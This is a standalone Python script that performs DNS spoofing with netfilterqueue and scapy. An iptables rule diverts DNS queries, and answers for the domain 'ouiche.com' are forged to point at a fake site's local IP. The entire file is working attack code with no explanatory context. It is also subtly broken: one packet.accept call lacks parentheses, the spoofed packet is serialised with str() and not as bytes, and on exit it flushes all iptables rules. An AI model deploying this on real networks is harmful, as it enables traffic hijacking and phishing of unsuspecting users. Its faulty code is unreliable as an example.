from netfilterqueue import NetfilterQueue
from scapy.all import *
import os

domain = 'ouiche.com' #Domain to spoof
localIP = '10.0.0.2' #IP Address of the fake site

#IPTables rule to let packets pass
os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

def callback(packet):
    #Get packet data
    payload = packet.get_payload()
    pkt = IP(payload)
    
    if pkt.haslayer(DNSQR):
        if str.encode(domain) in pkt[DNS].qd.qname:

            #Create spoofed response with packet informations
            spoofed_pkt =   IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qr=1, aa=1, qdcount=1, qd=pkt[DNS].qd,\
                            an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=localIP))

            #Update packet with spoofed response
            packet.set_payload(str.encode(str(spoofed_pkt)))
            print("Domain : " + str(pkt[DNS].qd.qname) + " assigned to " + localIP)

            #Authorize packet to go
            packet.accept
            print("Packet Sent to " + str(pkt[IP].src))
        else :
            packet.accept()
            
    else :
        packet.accept()

#Main Method
def main():
    q = NetfilterQueue()
    q.bind(1, callback)
    try:
        q.run() # Main loop
    except KeyboardInterrupt:
        q.unbind()
        os.system('iptables -F')
        os.system('iptables -X')

main()